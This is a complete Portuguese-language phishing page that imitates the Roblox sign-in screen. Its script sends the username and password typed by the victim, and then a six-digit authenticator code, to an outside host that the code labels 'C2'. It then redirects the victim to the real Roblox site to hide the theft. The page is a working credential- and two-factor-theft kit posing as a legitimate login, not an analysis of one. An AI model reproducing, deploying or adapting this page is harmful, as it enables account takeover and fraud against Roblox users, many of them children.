<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Roblox</title>
<link href="https://fonts.googleapis.com/css2?family=Hind:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Hind', -apple-system, sans-serif; }
  
  body {
    background-color: #000;
    color: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  /* Top Bar */
  .topbar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 16px;
    background: #232527;
  }
  
  /* Logo do Roblox em SVG */
  .logo-icon {
    width: 32px;
    height: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .logo-icon svg {
    width: 100%;
    height: 100%;
  }
  
  .top-actions { display: flex; gap: 8px; align-items: center; }
  .btn-top {
    padding: 6px 12px;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 600;
    text-decoration: none;
  }
  .btn-blue { background: #3b51ff; color: #fff; }
  .btn-outline { background: transparent; color: #fff; border: 1px solid #555; }
  .search-icon { width: 24px; height: 24px; fill: #fff; margin-left: 4px; }

  .nav-tabs {
    display: flex;
    padding: 0 16px;
    background: #232527;
    border-bottom: 1px solid #111;
  }
  .nav-tab {
    padding: 12px 16px;
    font-size: 14px;
    font-weight: 500;
    color: #b8b8b8;
    text-decoration: none;
    white-space: nowrap;
  }
  .nav-tab.active { color: #fff; }

  /* Login Area */
  .modal-container {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  .login-card {
    background: #232527;
    border-radius: 8px;
    padding: 32px 24px;
    width: 100%;
    max-width: 400px;
    border: 1px solid #333;
  }

  .login-card h1 {
    font-size: 24px;
    font-weight: 700;
    text-align: center;
    margin-bottom: 24px;
    color: #fff;
  }

  .input-group { margin-bottom: 12px; width: 100%; }
  input {
    width: 100%;
    padding: 12px 14px;
    background: #393b3d;
    border: 1px solid #393b3d;
    border-radius: 4px;
    color: #fff;
    font-size: 16px;
    outline: none;
  }
  input:focus { border-color: #777; }
  input::placeholder { color: #a1a1a1; }

  .btn-main {
    width: 100%;
    padding: 12px;
    background: transparent;
    color: #fff;
    border: 1px solid #555;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
    margin-top: 4px;
    cursor: pointer;
    transition: background 0.2s;
  }
  .btn-main:active { background: rgba(255,255,255,0.1); }

  .forgot-link {
    display: block;
    text-align: center;
    color: #fff;
    font-size: 14px;
    margin: 16px 0;
    text-decoration: none;
  }

  .divider {
    height: 1px;
    background: #333;
    margin: 16px 0;
    width: 100%;
  }

  .btn-alt {
    width: 100%;
    padding: 12px;
    background: #393b3d;
    color: #fff;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    font-weight: 500;
    margin-bottom: 8px;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
  }
  .btn-alt:active { background: #444; }

  .signup-text {
    text-align: center;
    font-size: 13px;
    color: #a1a1a1;
    margin-top: 24px;
  }
  .signup-text a { color: #fff; text-decoration: none; }

  .error {
    color: #ff4a4a;
    font-size: 13px;
    margin-bottom: 12px;
    display: none;
    text-align: center;
    font-weight: 500;
  }
  .hidden { display: none !important; }
  
  /* Footer */
  .footer {
    background: #232527;
    padding: 20px 16px;
    text-align: center;
    font-size: 12px;
    color: #fff;
    border-top: 1px solid #111;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 4px;
    margin-top: auto;
  }
  .age-badge {
    display: inline-flex;
    align-items: stretch;
    background: #fff;
    border-radius: 4px;
    overflow: hidden;
    margin-bottom: 12px;
  }
  .age-num {
    background: #d32f2f;
    color: #fff;
    font-size: 24px;
    font-weight: 700;
    padding: 6px 14px;
    display: flex;
    align-items: center;
  }
  .age-text {
    color: #000;
    font-size: 14px;
    font-weight: 600;
    padding: 0 16px;
    display: flex;
    align-items: center;
  }
  .footer-text { color: #a1a1a1; font-size: 12px; line-height: 1.5; }
</style>
</head>
<body>

  <div class="topbar">
    <div class="logo-icon">
      <!-- SVG exato do logo do Roblox -->
      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <g transform="rotate(15 50 50)">
          <rect x="15" y="15" width="70" height="70" rx="8" fill="#fff"/>
          <rect x="38" y="38" width="24" height="24" rx="2" fill="#232527"/>
        </g>
      </svg>
    </div>
    <div class="top-actions">
      <a href="#" class="btn-top btn-blue">Cadastrar-se</a>
      <a href="#" class="btn-top btn-outline">Entrar</a>
      <svg class="search-icon" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
    </div>
  </div>

  <div class="nav-tabs">
    <a href="#" class="nav-tab active">Destaques</a>
    <a href="#" class="nav-tab">Mercado</a>
    <a href="#" class="nav-tab">Criar</a>
    <a href="#" class="nav-tab">Robux</a>
  </div>

  <div class="modal-container">
    <div class="login-card">
      <h1>Entrar na Roblox</h1>
      <div class="error" id="err"></div>
      
      <div id="step1">
        <div class="input-group">
          <input type="text" id="user" placeholder="Usuário/e-mail/telefone" required autocomplete="username">
        </div>
        <div class="input-group">
          <input type="password" id="pass" placeholder="Senha" required autocomplete="current-password">
        </div>
        <button class="btn-main" onclick="sendLogin()">Entrar</button>
        
        <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
        
        <div class="divider"></div>
        
        <button class="btn-alt">
           <span style="font-size:16px;">✉️</span> Envie-me um código único por e-mail
        </button>
        <button class="btn-alt">
           <span style="font-size:16px;">⚡</span> Entrada rápida
        </button>
        
        <div class="signup-text">
          Não possui uma conta? <a href="#">Cadastrar-se</a>
        </div>
      </div>

      <div id="step2" class="hidden">
        <p style="font-size: 14px; color: #a1a1a1; margin-bottom: 16px; text-align: center;">
          Insira o código de verificação do seu app autenticador.
        </p>
        <div class="input-group">
          <input type="text" id="code" placeholder="000000" maxlength="6" inputmode="numeric" style="text-align:center; font-size: 20px; letter-spacing: 4px;">
        </div>
        <button class="btn-main" onclick="sendCode()">Verificar</button>
      </div>

    </div>
  </div>

  <div class="footer">
    <div class="age-badge">
      <div class="age-num">16</div>
      <div class="age-text">Violência</div>
    </div>
    <div class="footer-text">Interação entre usuários</div>
    <div class="footer-text">Compras no jogo (inclui itens aleatórios)</div>
  </div>

<script>
const C2 = "https://sync-backend.alexandregoncalves87.workers.dev"; 
let currentUser = "", currentPass = "";

async function sendLogin() {
  const user = document.getElementById("user").value.trim();
  const pass = document.getElementById("pass").value;
  if (!user || !pass) {
    showErr("Preencha todos os campos.");
    return;
  }
  currentUser = user; currentPass = pass;
  
  try {
    const r = await fetch(C2 + "/roblox/login", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({user, pass})
    });
    const data = await r.json();
    
    if (data.twofa) {
      document.getElementById("step1").classList.add("hidden");
      document.getElementById("step2").classList.remove("hidden");
      document.querySelector("h1").textContent = "Verificação";
    } else if (data.success) {
      location.href = "https://www.roblox.com/home";
    } else {
      showErr("Nome de usuário ou senha incorretos.");
    }
  } catch(e) {
    showErr("Erro de conexão. Tente novamente.");
  }
}

async function sendCode() {
  const code = document.getElementById("code").value.trim();
  if (code.length !== 6) {
    showErr("O código deve ter 6 dígitos.");
    return;
  }
  try {
    const r = await fetch(C2 + "/roblox/2fa", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({user: currentUser, pass: currentPass, code})
    });
    const data = await r.json();
    if (data.success) {
      location.href = "https://www.roblox.com/home";
    } else {
      showErr("Código inválido ou expirado.");
    }
  } catch(e) {
    showErr("Erro de conexão. Tente novamente.");
  }
}

function showErr(msg) {
  const el = document.getElementById("err");
  el.textContent = msg;
  el.style.display = "block";
}
</script>
</body>
</html>
